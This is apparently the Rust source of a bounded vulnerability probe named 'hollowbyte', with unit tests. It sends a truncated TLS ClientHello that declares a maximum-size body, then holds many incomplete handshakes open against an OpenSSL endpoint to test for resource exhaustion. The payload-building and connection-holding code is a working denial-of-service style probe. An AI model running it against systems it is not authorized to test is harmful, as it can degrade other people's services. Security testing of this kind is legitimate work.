use std::error::Error;
use std::fmt::{self, Display, Formatter};
use std::io::{self, Write};
use std::net::{IpAddr, SocketAddr, TcpStream, ToSocketAddrs};
use std::thread;
use std::time::{Duration, Instant};

use clap::Parser;

pub const DEFAULT_PORT: u16 = 443;
pub const DEFAULT_CONNECTIONS: u16 = 1;
pub const DEFAULT_HOLD_SECONDS: u64 = 5;
pub const DEFAULT_CONNECT_TIMEOUT_MS: u64 = 3_000;
pub const MAX_CONNECTIONS: u16 = 256;
pub const MAX_HOLD_SECONDS: u64 = 300;
pub const MAX_CLIENT_HELLO_BODY: u32 = 131_396;
const MIN_CLIENT_HELLO_BODY: u32 = 3;
const OBSERVATION_INTERVAL: Duration = Duration::from_millis(25);

#[derive(Debug, Parser)]
#[command(
    name = "hollowbyte",
    about = "Send a bounded OpenSSL HollowByte probe to an authorized TLS endpoint"
)]
pub struct Cli {
    /// Hostname or IP address of the authorized test endpoint.
    #[arg(env = "HOLLOWBYTE_TARGET")]
    pub target: String,

    /// TCP port of the TLS endpoint.
    #[arg(long, env = "HOLLOWBYTE_PORT", default_value_t = DEFAULT_PORT)]
    pub port: u16,

    /// Number of incomplete handshakes to hold open.
    #[arg(
        short = 'n',
        long,
        env = "HOLLOWBYTE_CONNECTIONS",
        default_value_t = DEFAULT_CONNECTIONS,
        value_parser = clap::value_parser!(u16).range(1..=i64::from(MAX_CONNECTIONS))
    )]
    pub connections: u16,

    /// Seconds to retain the incomplete handshakes before closing them.
    #[arg(
        long,
        env = "HOLLOWBYTE_HOLD_SECONDS",
        default_value_t = DEFAULT_HOLD_SECONDS,
        value_parser = clap::value_parser!(u64).range(0..=MAX_HOLD_SECONDS)
    )]
    pub hold_seconds: u64,

    /// Declared ClientHello body length. The default is OpenSSL's historical maximum.
    #[arg(
        long,
        env = "HOLLOWBYTE_DECLARED_SIZE",
        default_value_t = MAX_CLIENT_HELLO_BODY,
        value_parser = clap::value_parser!(u32).range(MIN_CLIENT_HELLO_BODY as i64..=MAX_CLIENT_HELLO_BODY as i64)
    )]
    pub declared_size: u32,

    /// Timeout in milliseconds for each connection attempt and write.
    #[arg(
        long,
        env = "HOLLOWBYTE_CONNECT_TIMEOUT_MS",
        default_value_t = DEFAULT_CONNECT_TIMEOUT_MS,
        value_parser = clap::value_parser!(u64).range(1..=60_000)
    )]
    pub connect_timeout_ms: u64,
}

#[derive(Debug)]
pub enum ProbeError {
    InvalidDeclaredSize(u32),
    Resolve { target: String, source: io::Error },
    NoAddresses(String),
}

impl Display for ProbeError {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> fmt::Result {
        match self {
            Self::InvalidDeclaredSize(size) => write!(
                formatter,
                "declared ClientHello size {size} is outside {MIN_CLIENT_HELLO_BODY}..={MAX_CLIENT_HELLO_BODY}"
            ),
            Self::Resolve { target, source } => {
                write!(formatter, "could not resolve {target}: {source}")
            }
            Self::NoAddresses(target) => {
                write!(formatter, "DNS returned no addresses for {target}")
            }
        }
    }
}

impl Error for ProbeError {
    fn source(&self) -> Option<&(dyn Error + 'static)> {
        match self {
            Self::Resolve { source, .. } => Some(source),
            Self::InvalidDeclaredSize(_) | Self::NoAddresses(_) => None,
        }
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ReachabilityState {
    Reachable,
    Unreachable(io::ErrorKind),
}

impl Display for ReachabilityState {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> fmt::Result {
        match self {
            Self::Reachable => formatter.write_str("reachable"),
            Self::Unreachable(kind) => write!(formatter, "unreachable ({kind:?})"),
        }
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum FailureStage {
    Connect,
    Configure,
    Send,
    Observe,
}

impl Display for FailureStage {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> fmt::Result {
        match self {
            Self::Connect => formatter.write_str("connect"),
            Self::Configure => formatter.write_str("configure"),
            Self::Send => formatter.write_str("send"),
            Self::Observe => formatter.write_str("observe"),
        }
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ConnectionState {
    HeldOpen,
    ClosedGracefully,
    ClosedWithError(io::ErrorKind),
    Responded(usize),
    Failed {
        stage: FailureStage,
        kind: io::ErrorKind,
    },
}

impl Display for ConnectionState {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> fmt::Result {
        match self {
            Self::HeldOpen => formatter.write_str("held-open"),
            Self::ClosedGracefully => formatter.write_str("closed-by-peer"),
            Self::ClosedWithError(kind) => write!(formatter, "closed-by-peer ({kind:?})"),
            Self::Responded(bytes) => {
                write!(formatter, "peer-responded ({bytes} byte(s) available)")
            }
            Self::Failed { stage, kind } => write!(formatter, "failed-{stage} ({kind:?})"),
        }
    }
}

#[derive(Debug)]
pub struct ConnectionReport {
    pub number: u16,
    pub address: Option<SocketAddr>,
    pub state: ConnectionState,
    pub observed_for: Duration,
}

#[derive(Debug)]
pub struct ProbeReport {
    pub target: String,
    pub payload: Vec<u8>,
    pub baseline: ReachabilityState,
    pub during: ReachabilityState,
    pub after: ReachabilityState,
    pub connections: Vec<ConnectionReport>,
}

impl ProbeReport {
    #[must_use]
    pub fn held_open_count(&self) -> usize {
        self.connections
            .iter()
            .filter(|report| matches!(report.state, ConnectionState::HeldOpen))
            .count()
    }
}

impl Display for ProbeReport {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> fmt::Result {
        let payload_hex = self
            .payload
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect::<Vec<_>>()
            .join(" ");

        writeln!(formatter, "target: {}", self.target)?;
        writeln!(formatter, "payload: {payload_hex}")?;
        writeln!(formatter, "baseline TCP: {}", self.baseline)?;
        for report in &self.connections {
            match report.address {
                Some(address) => writeln!(
                    formatter,
                    "connection {} ({address}): {} after {} ms",
                    report.number,
                    report.state,
                    report.observed_for.as_millis()
                )?,
                None => writeln!(
                    formatter,
                    "connection {}: {} after {} ms",
                    report.number,
                    report.state,
                    report.observed_for.as_millis()
                )?,
            }
        }
        writeln!(formatter, "TCP while probes active: {}", self.during)?;
        writeln!(formatter, "TCP after probes closed: {}", self.after)?;
        writeln!(
            formatter,
            "result: {}/{} connection(s) remained open for the observation window",
            self.held_open_count(),
            self.connections.len()
        )?;
        formatter.write_str(
            "interpretation: held-open is consistent with an incomplete TLS handshake, but does not distinguish patched from vulnerable OpenSSL; verify process RSS or the linked OpenSSL version on the server",
        )
    }
}

struct ActiveConnection {
    number: u16,
    address: SocketAddr,
    stream: TcpStream,
}

pub fn run(cli: &Cli) -> Result<ProbeReport, ProbeError> {
    let target = display_target(&cli.target, cli.port);
    let addresses = resolve(&cli.target, cli.port)?;
    let timeout = Duration::from_millis(cli.connect_timeout_ms);
    let payload = build_payload(cli.declared_size)?;
    let baseline = check_reachability(&addresses, timeout);
    let mut active = Vec::with_capacity(usize::from(cli.connections));
    let mut connections = Vec::with_capacity(usize::from(cli.connections));

    for number in 1..=cli.connections {
        match open_probe(number, &addresses, timeout, &payload) {
            Ok(connection) => active.push(connection),
            Err(report) => connections.push(report),
        }
    }

    let during = check_reachability(&addresses, timeout);
    observe_connections(
        &mut active,
        &mut connections,
        Duration::from_secs(cli.hold_seconds),
    );
    connections.sort_by_key(|report| report.number);

    let after = check_reachability(&addresses, timeout);

    Ok(ProbeReport {
        target,
        payload,
        baseline,
        during,
        after,
        connections,
    })
}

pub fn build_payload(declared_size: u32) -> Result<Vec<u8>, ProbeError> {
    if !(MIN_CLIENT_HELLO_BODY..=MAX_CLIENT_HELLO_BODY).contains(&declared_size) {
        return Err(ProbeError::InvalidDeclaredSize(declared_size));
    }

    let length = declared_size.to_be_bytes();
    Ok(vec![
        0x16, // TLS record: handshake
        0x03, 0x01, // TLS 1.0 legacy record version
        0x00, 0x06, // Six bytes of record data follow
        0x01, // Handshake: ClientHello
        length[1], length[2], length[3], // Three-byte declared body length
        0x03, 0x03, // Partial ClientHello: TLS 1.2 legacy version
    ])
}

fn resolve(host: &str, port: u16) -> Result<Vec<SocketAddr>, ProbeError> {
    let target = display_target(host, port);
    let addresses = (host, port)
        .to_socket_addrs()
        .map_err(|source| ProbeError::Resolve {
            target: target.clone(),
            source,
        })?
        .collect::<Vec<_>>();

    if addresses.is_empty() {
        return Err(ProbeError::NoAddresses(target));
    }

    Ok(addresses)
}

fn display_target(host: &str, port: u16) -> String {
    match host.parse::<IpAddr>() {
        Ok(IpAddr::V6(_)) => format!("[{host}]:{port}"),
        Ok(IpAddr::V4(_)) | Err(_) => format!("{host}:{port}"),
    }
}

fn connect_any(
    addresses: &[SocketAddr],
    timeout: Duration,
) -> Result<(TcpStream, SocketAddr), io::ErrorKind> {
    let mut last_kind = io::ErrorKind::AddrNotAvailable;
    for address in addresses {
        match TcpStream::connect_timeout(address, timeout) {
            Ok(stream) => return Ok((stream, *address)),
            Err(error) => last_kind = error.kind(),
        }
    }
    Err(last_kind)
}

fn check_reachability(addresses: &[SocketAddr], timeout: Duration) -> ReachabilityState {
    match connect_any(addresses, timeout) {
        Ok((_stream, _address)) => ReachabilityState::Reachable,
        Err(kind) => ReachabilityState::Unreachable(kind),
    }
}

fn open_probe(
    number: u16,
    addresses: &[SocketAddr],
    timeout: Duration,
    payload: &[u8],
) -> Result<ActiveConnection, ConnectionReport> {
    let (mut stream, address) =
        connect_any(addresses, timeout).map_err(|kind| ConnectionReport {
            number,
            address: None,
            state: ConnectionState::Failed {
                stage: FailureStage::Connect,
                kind,
            },
            observed_for: Duration::ZERO,
        })?;

    if let Err(error) = stream.set_write_timeout(Some(timeout)) {
        return Err(ConnectionReport {
            number,
            address: Some(address),
            state: ConnectionState::Failed {
                stage: FailureStage::Configure,
                kind: error.kind(),
            },
            observed_for: Duration::ZERO,
        });
    }

    if let Err(error) = stream.write_all(payload) {
        return Err(ConnectionReport {
            number,
            address: Some(address),
            state: ConnectionState::Failed {
                stage: FailureStage::Send,
                kind: error.kind(),
            },
            observed_for: Duration::ZERO,
        });
    }

    if let Err(error) = stream.set_nonblocking(true) {
        return Err(ConnectionReport {
            number,
            address: Some(address),
            state: ConnectionState::Failed {
                stage: FailureStage::Configure,
                kind: error.kind(),
            },
            observed_for: Duration::ZERO,
        });
    }

    Ok(ActiveConnection {
        number,
        address,
        stream,
    })
}

fn observe_connections(
    active: &mut Vec<ActiveConnection>,
    reports: &mut Vec<ConnectionReport>,
    observation_window: Duration,
) {
    let started = Instant::now();

    loop {
        let elapsed = started.elapsed();
        let window_complete = elapsed >= observation_window;
        let mut still_open = Vec::with_capacity(active.len());

        for connection in active.drain(..) {
            let state = observe_state(&connection.stream);
            if state == ConnectionState::HeldOpen && !window_complete {
                still_open.push(connection);
            } else {
                reports.push(ConnectionReport {
                    number: connection.number,
                    address: Some(connection.address),
                    state,
                    observed_for: elapsed,
                });
            }
        }

        *active = still_open;
        if active.is_empty() || window_complete {
            return;
        }

        let remaining = observation_window.saturating_sub(started.elapsed());
        thread::sleep(OBSERVATION_INTERVAL.min(remaining));
    }
}

fn observe_state(stream: &TcpStream) -> ConnectionState {
    let mut bytes = [0_u8; 7];
    match stream.peek(&mut bytes) {
        Ok(0) => ConnectionState::ClosedGracefully,
        Ok(count) => ConnectionState::Responded(count),
        Err(error) if error.kind() == io::ErrorKind::WouldBlock => ConnectionState::HeldOpen,
        Err(error)
            if matches!(
                error.kind(),
                io::ErrorKind::ConnectionAborted
                    | io::ErrorKind::ConnectionReset
                    | io::ErrorKind::BrokenPipe
            ) =>
        {
            ConnectionState::ClosedWithError(error.kind())
        }
        Err(error) => ConnectionState::Failed {
            stage: FailureStage::Observe,
            kind: error.kind(),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use clap::Parser;
    use std::net::TcpListener;

    #[test]
    fn maximum_payload_is_the_expected_eleven_bytes() {
        let payload = build_payload(MAX_CLIENT_HELLO_BODY).expect("maximum size should be valid");

        assert_eq!(
            payload,
            [
                0x16, 0x03, 0x01, 0x00, 0x06, 0x01, 0x02, 0x01, 0x44, 0x03, 0x03
            ]
        );
    }

    #[test]
    fn payload_encodes_a_custom_three_byte_length() {
        let payload = build_payload(0x01_02_03).expect("custom size should be valid");

        assert_eq!(&payload[6..9], &[0x01, 0x02, 0x03]);
        assert_eq!(payload.len(), 11);
    }

    #[test]
    fn payload_rejects_lengths_outside_the_supported_range() {
        assert!(matches!(
            build_payload(MIN_CLIENT_HELLO_BODY - 1),
            Err(ProbeError::InvalidDeclaredSize(_))
        ));
        assert!(matches!(
            build_payload(MAX_CLIENT_HELLO_BODY + 1),
            Err(ProbeError::InvalidDeclaredSize(_))
        ));
    }

    #[test]
    fn cli_uses_bounded_defaults() {
        let cli = Cli::try_parse_from(["hollowbyte", "example.test"])
            .expect("default CLI arguments should parse");

        assert_eq!(cli.target, "example.test");
        assert_eq!(cli.port, DEFAULT_PORT);
        assert_eq!(cli.connections, DEFAULT_CONNECTIONS);
        assert_eq!(cli.hold_seconds, DEFAULT_HOLD_SECONDS);
        assert_eq!(cli.declared_size, MAX_CLIENT_HELLO_BODY);
    }

    #[test]
    fn cli_rejects_connection_counts_over_the_safety_limit() {
        let too_many = (u32::from(MAX_CONNECTIONS) + 1).to_string();

        assert!(
            Cli::try_parse_from(["hollowbyte", "example.test", "--connections", &too_many])
                .is_err()
        );
    }

    #[test]
    fn observation_reports_a_connection_held_for_the_full_window() {
        let listener = TcpListener::bind(("127.0.0.1", 0)).expect("listener should bind");
        let listener_address = listener
            .local_addr()
            .expect("listener should have an address");
        let client = TcpStream::connect(listener_address).expect("client should connect");
        let (_server, _client_address) = listener.accept().expect("server should accept");
        client
            .set_nonblocking(true)
            .expect("client should become nonblocking");
        let mut active = vec![ActiveConnection {
            number: 1,
            address: listener_address,
            stream: client,
        }];
        let mut reports = Vec::new();
        let observation_window = Duration::from_millis(5);

        observe_connections(&mut active, &mut reports, observation_window);

        assert!(active.is_empty());
        assert_eq!(reports.len(), 1);
        assert_eq!(reports[0].state, ConnectionState::HeldOpen);
        assert!(reports[0].observed_for >= observation_window);
    }

    #[test]
    fn ipv6_targets_are_displayed_with_brackets() {
        assert_eq!(display_target("2001:db8::1", 443), "[2001:db8::1]:443");
        assert_eq!(display_target("example.test", 443), "example.test:443");
    }
}
